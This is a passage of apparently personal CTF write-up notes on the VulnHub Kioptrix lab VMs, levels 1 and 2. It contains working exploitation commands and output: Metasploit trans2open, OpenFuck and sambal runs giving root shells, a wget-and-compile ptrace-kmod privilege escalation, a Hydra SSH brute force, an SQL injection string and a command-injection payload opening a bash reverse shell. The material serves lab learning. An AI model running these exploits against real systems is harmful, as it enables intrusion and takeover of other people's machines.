S-1-5-21-4157223341-3243572438-1405127623-508 KIOPTRIX\\unix_group.2147483402 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-509 KIOPTRIX\\unix_group.2147483402 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-510 KIOPTRIX\\unix_group.2147483403 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-511 KIOPTRIX\\unix_group.2147483403 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-512 KIOPTRIX\\Domain Admins (Local Group) S-1-5-21-4157223341-3243572438-1405127623-513 KIOPTRIX\\Domain Users (Local Group) S-1-5-21-4157223341-3243572438-1405127623-514 KIOPTRIX\\Domain Guests (Local Group) S-1-5-21-4157223341-3243572438-1405127623-515 KIOPTRIX\\unix_group.2147483405 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-516 KIOPTRIX\\unix_group.2147483406 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-517 KIOPTRIX\\unix_group.2147483406 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-518 KIOPTRIX\\unix_group.2147483407 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-519 KIOPTRIX\\unix_group.2147483407 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-520 KIOPTRIX\\unix_group.2147483408 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-521 KIOPTRIX\\unix_group.2147483408 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-522 KIOPTRIX\\unix_group.2147483409 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-523 KIOPTRIX\\unix_group.2147483409 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-524 KIOPTRIX\\unix_group.2147483410 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-525 KIOPTRIX\\unix_group.2147483410 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-526 KIOPTRIX\\unix_group.2147483411 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-527 KIOPTRIX\\unix_group.2147483411 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-528 KIOPTRIX\\unix_group.2147483412 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-529 KIOPTRIX\\unix_group.2147483412 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-530 KIOPTRIX\\unix_group.2147483413 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-531 KIOPTRIX\\unix_group.2147483413 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-532 KIOPTRIX\\unix_group.2147483414 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-533 KIOPTRIX\\unix_group.2147483414 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-534 KIOPTRIX\\unix_group.2147483415 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-535 KIOPTRIX\\unix_group.2147483415 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-536 KIOPTRIX\\unix_group.2147483416 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-537 KIOPTRIX\\unix_group.2147483416 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-538 KIOPTRIX\\unix_group.2147483417 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-539 KIOPTRIX\\unix_group.2147483417 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-540 KIOPTRIX\\unix_group.2147483418 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-541 KIOPTRIX\\unix_group.2147483418 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-542 KIOPTRIX\\unix_group.2147483419 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-543 KIOPTRIX\\unix_group.2147483419 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-544 KIOPTRIX\\unix_group.2147483420 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-545 KIOPTRIX\\unix_group.2147483420 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-546 KIOPTRIX\\unix_group.2147483421 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-547 KIOPTRIX\\unix_group.2147483421 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-548 KIOPTRIX\\unix_group.2147483422 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-549 KIOPTRIX\\unix_group.2147483422 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-550 KIOPTRIX\\unix_group.2147483423 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\\root (Local User) S-1-5-21-4157223341-3243572438-1405127623-1001 KIOPTRIX\\root (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1002 KIOPTRIX\\bin (Local User) S-1-5-21-4157223341-3243572438-1405127623-1003 KIOPTRIX\\bin (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1004 KIOPTRIX\\daemon (Local User) S-1-5-21-4157223341-3243572438-1405127623-1005 KIOPTRIX\\daemon (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1006 KIOPTRIX\\adm (Local User) S-1-5-21-4157223341-3243572438-1405127623-1007 KIOPTRIX\\sys (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1008 KIOPTRIX\\lp (Local User) S-1-5-21-4157223341-3243572438-1405127623-1009 KIOPTRIX\\adm (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1010 KIOPTRIX\\sync (Local User) S-1-5-21-4157223341-3243572438-1405127623-1011 KIOPTRIX\\tty (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1012 KIOPTRIX\\shutdown (Local User) S-1-5-21-4157223341-3243572438-1405127623-1013 KIOPTRIX\\disk (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1014 KIOPTRIX\\halt (Local User) S-1-5-21-4157223341-3243572438-1405127623-1015 KIOPTRIX\\lp (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1016 KIOPTRIX\\mail (Local User) S-1-5-21-4157223341-3243572438-1405127623-1017 KIOPTRIX\\mem (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1018 KIOPTRIX\\news (Local User) S-1-5-21-4157223341-3243572438-1405127623-1019 KIOPTRIX\\kmem (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1020 KIOPTRIX\\uucp (Local User) S-1-5-21-4157223341-3243572438-1405127623-1021 KIOPTRIX\\wheel (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1022 KIOPTRIX\\operator (Local User) S-1-5-21-4157223341-3243572438-1405127623-1023 KIOPTRIX\\unix_group.11 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1024 KIOPTRIX\\games (Local User) S-1-5-21-4157223341-3243572438-1405127623-1025 KIOPTRIX\\mail (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1026 KIOPTRIX\\gopher (Local User) S-1-5-21-4157223341-3243572438-1405127623-1027 KIOPTRIX\\news (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1028 KIOPTRIX\\ftp (Local User) S-1-5-21-4157223341-3243572438-1405127623-1029 KIOPTRIX\\uucp (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1030 KIOPTRIX\\unix_user.15 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1031 KIOPTRIX\\man (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1032 KIOPTRIX\\unix_user.16 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1033 KIOPTRIX\\unix_group.16 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1034 KIOPTRIX\\unix_user.17 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1035 KIOPTRIX\\unix_group.17 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1036 KIOPTRIX\\unix_user.18 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1037 KIOPTRIX\\unix_group.18 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1038 KIOPTRIX\\unix_user.19 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1039 KIOPTRIX\\floppy (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1040 KIOPTRIX\\unix_user.20 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1041 KIOPTRIX\\games (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1042 KIOPTRIX\\unix_user.21 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1043 KIOPTRIX\\slocate (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1044 KIOPTRIX\\unix_user.22 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1045 KIOPTRIX\\utmp (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1046 KIOPTRIX\\squid (Local User) S-1-5-21-4157223341-3243572438-1405127623-1047 KIOPTRIX\\squid (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1048 KIOPTRIX\\unix_user.24 (Local User) S-1-5-21-4157223341-3243572438-1405127623-1049 KIOPTRIX\\unix_group.24 (Local Group) S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\\unix_user.25 (Local User) =============================================== | Getting printer info for 192.168.88.129 | =============================================== No printers returned. enum4linux complete on Thu Jan 2 16:24:41 2020  192.168.88.129 - 22    Time command/module Finding     2019-12-31 13:22:06 nmap OpenSSH 2.9p2   2019-12-31 13:44:47 ssh old key exchange / ciphers DH SHA1/AES128-CBC    SSH ssh 192.168.88.129  Unable to negotiate with 192.168.88.129 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1  ssh 192.168.88.129 -oKexAlgorithms=diffie-hellman-group-exchange-sha1  Unable to negotiate with 192.168.88.129 port 22: no matching cipher found. Their offer: aes128-cbc,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,aes192-cbc,aes256-cbc,rijndael128-cbc,rijndael192-cbc,rijndael256-cbc,rijndael-cbc@lysator.liu.se  ssh 192.168.88.129 -oKexAlgorithms=diffie-hellman-group-exchange-sha1 -c aes128-cbc  root@192.168.88.129's password:  Exploit trans2open msf5 \u0026gt; workspace kioptrix * **Default msf5 \u0026gt; workspace kioptrix [*] Workspace: kioptrix msf5 \u0026gt; use exploit/linux/samba/trans2open msf5 exploit(linux/samba/trans2open) \u0026gt; show options Module options (exploit/linux/samba/trans2open): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 139 yes The target port (TCP) Exploit target: Id Name -- ---- 0 Samba 2.2.x - Bruteforce msf5 exploit(linux/samba/trans2open) \u0026gt; set RHOSTS 192.168.88.129 RHOSTS =\u0026gt; 192.168.88.129 msf5 exploit(linux/samba/trans2open) \u0026gt; options Module options (exploit/linux/samba/trans2open): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.88.129 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 139 yes The target port (TCP) Exploit target: Id Name -- ---- 0 Samba 2.2.x - Bruteforce msf5 exploit(linux/samba/trans2open) \u0026gt; show targets Exploit targets: Id Name -- ---- 0 Samba 2.2.x - Bruteforce msf5 exploit(linux/samba/trans2open) \u0026gt; run [*] Started reverse TCP handler on 192.168.88.128:4444 [*] 192.168.88.129:139 - Trying return address 0xbffffdfc... [*] 192.168.88.129:139 - Trying return address 0xbffffcfc... [*] 192.168.88.129:139 - Trying return address 0xbffffbfc... [*] 192.168.88.129:139 - Trying return address 0xbffffafc... [*] Sending stage (985320 bytes) to 192.168.88.129 [*] 192.168.88.129 - Meterpreter session 1 closed. Reason: Died [*] Meterpreter session 1 opened (127.0.0.1 -\u0026gt; 192.168.88.129:32800) at 2020-01-02 18:10:24 +0100 [*] 192.168.88.129:139 - Trying return address 0xbffff9fc... [*] Sending stage (985320 bytes) to 192.168.88.129 [*] Meterpreter session 2 opened (192.168.88.128:4444 -\u0026gt; 192.168.88.129:32801) at 2020-01-02 18:10:25 +0100 [*] 192.168.88.129 - Meterpreter session 2 closed. Reason: Died [*] 192.168.88.129:139 - Trying return address 0xbffff8fc... [*] Sending stage (985320 bytes) to 192.168.88.129 [*] 192.168.88.129 - Meterpreter session 3 closed. Reason: Died [*] Meterpreter session 3 opened (127.0.0.1 -\u0026gt; 192.168.88.129:32802) at 2020-01-02 18:10:27 +0100 [*] 192.168.88.129:139 - Trying return address 0xbffff7fc... [*] Sending stage (985320 bytes) to 192.168.88.129 [*] 192.168.88.129 - Meterpreter session 4 closed. Reason: Died [*] Meterpreter session 4 opened (127.0.0.1 -\u0026gt; 192.168.88.129:32803) at 2020-01-02 18:10:28 +0100 msf5 exploit(linux/samba/trans2open) \u0026gt; set payload linux/x86/shell_reverse_tcp payload =\u0026gt; linux/x86/shell_reverse_tcp msf5 exploit(linux/samba/trans2open) \u0026gt; show options Module options (exploit/linux/samba/trans2open): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 192.168.88.129 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:\u0026lt;path\u0026gt;' RPORT 139 yes The target port (TCP) Payload options (linux/x86/shell_reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- CMD /bin/sh yes The command string to execute LHOST 192.168.88.128 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Samba 2.2.x - Bruteforce msf5 exploit(linux/samba/trans2open) \u0026gt; run [*] Started reverse TCP handler on 192.168.88.128:4444 [*] 192.168.88.129:139 - Trying return address 0xbffffdfc... [*] 192.168.88.129:139 - Trying return address 0xbffffcfc... [*] 192.168.88.129:139 - Trying return address 0xbffffbfc... [*] 192.168.88.129:139 - Trying return address 0xbffffafc... [*] Command shell session 5 opened (192.168.88.128:4444 -\u0026gt; 192.168.88.129:32804) at 2020-01-02 18:14:44 +0100 whoami root hostname kioptrix.level1  OpenFuck root@kali:/opt# git clone https://github.com/heltonWernik/OpenLuck Cloning into 'OpenLuck'... remote: Enumerating objects: 22, done. remote: Total 22 (delta 0), reused 0 (delta 0), pack-reused 22 Unpacking objects: 100% (22/22), done. root@kali:/opt# cd OpenLuck/ root@kali:/opt/OpenLuck# ls OpenFuck.c README.md root@kali:/opt/OpenLuck# apt install libssl-dev;gcc -o OpenFuck OpenFuck.c -lcrypto Reading package lists... Done Building dependency tree Reading state information... Done The following packages were automatically installed and are no longer required: libayatana-ido3-0.4-0 libbfio1 libdvdread4 libhogweed4 libhwloc5 libisl21 libjim0.77 libjte1 libnettle6 libobjc-9-dev python-magic python-paramiko python-pefile python-qrcode Use 'apt autoremove' to remove them. Suggested packages: libssl-doc The following NEW packages will be installed: libssl-dev 0 upgraded, 1 newly installed, 0 to remove and 62 not upgraded. Need to get 1,797 kB of archives. After this operation, 8,095 kB of additional disk space will be used. Get:1 http://ftp2.nluug.nl/os/Linux/distr/kali kali-rolling/main amd64 libssl-dev amd64 1.1.1d-2 [1,797 kB] Fetched 1,797 kB in 1s (2,965 kB/s) Selecting previously unselected package libssl-dev:amd64. (Reading database ... 311173 files and directories currently installed.) Preparing to unpack .../libssl-dev_1.1.1d-2_amd64.deb ... Unpacking libssl-dev:amd64 (1.1.1d-2) ... Setting up libssl-dev:amd64 (1.1.1d-2) ... root@kali:/opt/OpenLuck# ls OpenFuck OpenFuck.c README.md root@kali:/opt/OpenLuck# ./OpenFuck ******************************************************************* * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* : Usage: ./OpenFuck target box [port] [-c N] target - supported box eg: 0x00 box - hostname or IP address port - port for ssl connection -c open N connections. (use range 40-50 if u dont know) root@kali:/opt/OpenLuck# ./OpenFuck 0x6a 192.168.88.129 -c 40 ******************************************************************* * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f8050 Ready to send shellcode Spawning shell... root@kali:/opt/OpenLuck# ./OpenFuck 0x6b 192.168.88.129 -c 40 ******************************************************************* * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f81c8 Ready to send shellcode Spawning shell... bash: no job control in this shell bash-2.05$ exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- --13:24:59-- http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c =\u0026gt; `ptrace-kmod.c' Connecting to dl.packetstormsecurity.net:80... connected! HTTP request sent, awaiting response... 404 Not Found 13:24:59 ERROR 404: Not Found. gcc: ptrace-kmod.c: No such file or directory gcc: No input files rm: cannot remove `ptrace-kmod.c': No such file or directory bash: ./p: No such file or directory bash-2.05$ bash-2.05$ whoami whoami apache bash-2.05$ hostname hostname kioptrix.level1 bash-2.05$ Good Bye! root@kali:/opt/OpenLuck# ./OpenFuck 0x6b 192.168.88.129 -c 40 ******************************************************************* * OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open * ******************************************************************* * by SPABAM with code of Spabam - LSD-pl - SolarEclipse - CORE * * #hackarena irc.brasnet.org * * TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname * * #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam * * #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ * ******************************************************************* Connection... 40 of 40 Establishing SSL connection cipher: 0x4043808c ciphers: 0x80f8050 Ready to send shellcode Spawning shell... bash: no job control in this shell bash-2.05$ exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- --13:35:23-- http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c =\u0026gt; `ptrace-kmod.c' Connecting to dl.packetstormsecurity.net:80... connected! HTTP request sent, awaiting response... 301 Moved Permanently Location: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following] --13:35:23-- https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c =\u0026gt; `ptrace-kmod.c' Connecting to dl.packetstormsecurity.net:443... connected! HTTP request sent, awaiting response... 200 OK Length: 3,921 [text/x-csrc] 0K ... 100% @ 3.74 MB/s 13:35:23 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921] [+] Attached to 2071 [+] Waiting for signal [+] Signal caught [+] Shellcode placed at 0x4001189d [+] Now wait for suid shell... whoami root hostname kioptrix.level1  Sambal searchsploit \u0026quot;Samba \u0026lt; 2.2\u0026quot; ------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) ------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Samba 2.2.0 \u0026lt; 2.2.8 (OSX) - trans2open Overflow (Metasploit) | exploits/osx/remote/9924.rb Samba 2.2.2 \u0026lt; 2.2.6 - 'nttrans' Remote Buffer Overflow (Metasploit) (1) | exploits/linux/remote/16321.rb Samba \u0026lt; 2.2.8 (Linux/BSD) - Remote Code Execution | exploits/multiple/remote/10.c ------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Shellcodes: No Result searchsploit -m exploits/multiple/remote/10.c Exploit: Samba \u0026lt; 2.2.8 (Linux/BSD) - Remote Code Execution URL: https://www.exploit-db.com/exploits/10 Path: /usr/share/exploitdb/exploits/multiple/remote/10.c File Type: C source, ASCII text, with CRLF line terminators Copied to: /root/10.c gcc -o sambal 10.c ./sambal samba-2.2.8 \u0026lt; remote root exploit by eSDee (www.netric.org|be) -------------------------------------------------------------- Usage: ./sambal [-bBcCdfprsStv] [host] -b \u0026lt;platform\u0026gt; bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2) -B \u0026lt;step\u0026gt; bruteforce steps (default = 300) -c \u0026lt;ip address\u0026gt; connectback ip address -C \u0026lt;max childs\u0026gt; max childs for scan/bruteforce mode (default = 40) -d \u0026lt;delay\u0026gt; bruteforce/scanmode delay in micro seconds (default = 100000) -f force -p \u0026lt;port\u0026gt; port to attack (default = 139) -r \u0026lt;ret\u0026gt; return address -s scan mode (random) -S \u0026lt;network\u0026gt; scan mode -t \u0026lt;type\u0026gt; presets (0 for a list) -v verbose mode ./sambal -b 0 -v -c 192.168.88.128 192.168.88.129 samba-2.2.8 \u0026lt; remote root exploit by eSDee (www.netric.org|be) -------------------------------------------------------------- + Verbose mode. + Bruteforce mode. (Linux) + Host is running samba. + Using ret: [0xbffffed4] + Using ret: [0xbffffda8] + Using ret: [0xbffffc7c] + Using ret: [0xbffffb50] + Worked! -------------------------------------------------------------- *** JE MOET JE MUIL HOUWE Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown uid=0(root) gid=0(root) groups=99(nobody)  Bruteforce SSH Hydra hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8  Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-02 19:23:53 [DATA] max 8 tasks per 1 server, overall 8 tasks, 1009 login tries (l:1/p:1009), ~127 tries per task [DATA] attacking ssh://192.168.88.129:22/ [VERBOSE] Resolving addresses ... [VERBOSE] resolving done [INFO] Testing if password authentication is supported by ssh://root@192.168.88.129:22 [INFO] Successful, password authentication is supported by ssh://192.168.88.129:22 [STATUS] attack finished for 192.168.88.129 (waiting for children to complete tests) 1 of 1 target completed, 0 valid passwords found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-02 19:40:28  "
},
{
	"uri": "https://dev-hugo.justin-p.me/notes/ctfs/vulnhub/kioptrix/level2/",
	"title": "Level 2",
	"tags": ["VulnHub"],
	"description": "Notes from Kioptrix level 2 from Vulnhub.",
	"content": "level2    Proto port Service/URL Info Potential Vulns Verified Vulns       system CentOS 4.5 Linux 2.6.9-55.EL i686 \u0026lsquo;ip_append_data()\u0026rsquo; Ring0 Privilege Escalation (1) \u0026lsquo;sock_sendpage()\u0026rsquo; Local Privilege Escalation \u0026lsquo;sock_sendpage()\u0026rsquo;   TCP 22 SSH OpenSSH 3.9p1 (protocol 1.99)      TCP 80,443 HTTP/S Apache httpd 2.0.52 (EOL) no secuirty headers Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE CentOS 4.5 Linux 2.6.9-55.EL i686     PHP/4.3.9 (EOL) PHP Credits file SSLVerifyClient bypass PHP \u0026lt; 4.5.0 - Unserialize Overflow       TCP 80,443 http://192.168.88.130/index.php  SQL Injection admin ' OR ' 1'='1   TCP 80,443 http://192.168.88.130/pingit.php  Command Injection ip=8.8.8.8;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.88.128/4444 0\u0026gt;\u0026amp;1\u0026amp;submit=submit   TCP 111 RPC bind      TCP 620 status RPC      TCP 631 IPP CUPS 1.1 Allowed HTTP Methods: GET, HEAD, OPTIONS, POST, PUT '.HPGL\u0026rsquo; File Processor Buffer Overflow CUPS 1.1.x - Negative Length HTTP Header     TCP 3306 MySQL MySQL IP filtered     UDP 111 RPCbind       Enum Find IP nmap -n -sn -PR 192.168.88.0/24 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 20:32 CET Nmap scan report for 192.168.88.2 Host is up (0.00042s latency). MAC Address: 00:50:56:FE:4E:C1 (VMware) Nmap scan report for 192.168.88.130 Host is up (0.00099s latency). MAC Address: 00:0C:29:D7:71:4E (VMware) Nmap scan report for 192.168.88.254 Host is up (0.0028s latency). MAC Address: 00:50:56:F7:8F:D0 (VMware) Nmap scan report for 192.168.88.128 Host is up. Nmap done: 256 IP addresses (4 hosts up) scanned in 2.17 seconds  TCP nmap -T4 -p- -A 192.168.88.130 -oA tcp  Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 20:34 CET Nmap scan report for 192.168.88.130 Host is up (0.00060s latency). Not shown: 65528 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) | ssh-hostkey: | 1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1) | 1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA) |_ 1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA) |_sshv1: Server supports SSHv1 80/tcp open http Apache httpd 2.0.52 ((CentOS)) |_http-server-header: Apache/2.0.52 (CentOS) |_http-title: Site doesnt have a title (text/html; charset=UTF-8). 111/tcp open rpcbind 2 (RPC #100000) 443/tcp open ssl/https? |_ssl-date: 2020-01-02T17:25:48+00:00; -2h09m46s from scanner time. | sslv2: | SSLv2 supported | ciphers: | SSL2_DES_192_EDE3_CBC_WITH_MD5 | SSL2_RC4_64_WITH_MD5 | SSL2_RC4_128_WITH_MD5 | SSL2_RC4_128_EXPORT40_WITH_MD5 | SSL2_RC2_128_CBC_WITH_MD5 | SSL2_RC2_128_CBC_EXPORT40_WITH_MD5 |_ SSL2_DES_64_CBC_WITH_MD5 620/tcp open status 1 (RPC #100024) 631/tcp open ipp CUPS 1.1 | http-methods: |_ Potentially risky methods: PUT |_http-server-header: CUPS/1.1 |_http-title: 403 Forbidden 3306/tcp open mysql MySQL (unauthorized) MAC Address: 00:0C:29:D7:71:4E (VMware) Device type: general purpose Running: Linux 2.6.X OS CPE: cpe:/o:linux:linux_kernel:2.6 OS details: Linux 2.6.9 - 2.6.30 Network Distance: 1 hop Host script results: |_clock-skew: -2h09m46s TRACEROUTE HOP RTT ADDRESS 1 0.60 ms 192.168.88.130 OS and Service detection performed. Please report any incorrect results at https://nmap.org/ submit/ . Nmap done: 1 IP address (1 host up) scanned in 112.32 seconds  UDP nmap -sU -T4 192.168.88.130 -oA udp  Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-02 21:12 CET Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 1.40% done; ETC: 21:13 (0:01:10 remaining) Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 1.73% done; ETC: 21:14 (0:01:53 remaining) Stats: 0:15:05 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan UDP Scan Timing: About 93.13% done; ETC: 21:28 (0:01:07 remaining) Nmap scan report for 192.168.88.130 Host is up (0.00068s latency). Not shown: 957 closed ports, 42 open|filtered ports PORT STATE SERVICE 111/udp open rpcbind MAC Address: 00:0C:29:D7:71:4E (VMware) Nmap done: 1 IP address (1 host up) scanned in 1029.23 seconds  192.168.88.130 80/443 Nikto nikto -h 192.168.88.130  - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.88.130 + Target Hostname: 192.168.88.130 + Target Port: 80 + Start Time: 2020-01-02 20:35:53 (GMT1) --------------------------------------------------------------------------- + Server: Apache/2.0.52 (CentOS) + Retrieved x-powered-by header: PHP/4.3.9 + The anti-clickjacking X-Frame-Options header is not present. + The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type + Apache/2.0.52 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch. + Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE + Web Server returns a valid response with junk HTTP methods, this may cause false positives. + OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST + OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. + OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. + OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. + Uncommon header 'tcn' found, with contents: choice + OSVDB-3092: /manual/: Web server manual found. + OSVDB-3268: /icons/: Directory indexing found. + OSVDB-3268: /manual/images/: Directory indexing found. + Server may leak inodes via ETags, header found with file /icons/README, inode: 357810, size: 4872, mtime: Sat Mar 29 19:41:04 1980 + OSVDB-3233: /icons/README: Apache default file found. + 8725 requests: 1 error(s) and 17 item(s) reported on remote host + End Time: 2020-01-02 20:36:46 (GMT1) (53 seconds) ---------------------------------------------------------------------------  gobuster ./go/bin/gobuster dir -u http://192.168.88.130 -w /usr/share/wordlists/dirb/common.txt -t 40 -e  =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://192.168.88.130 [+] Threads: 40 [+] Wordlist: /usr/share/wordlists/dirb/common.txt 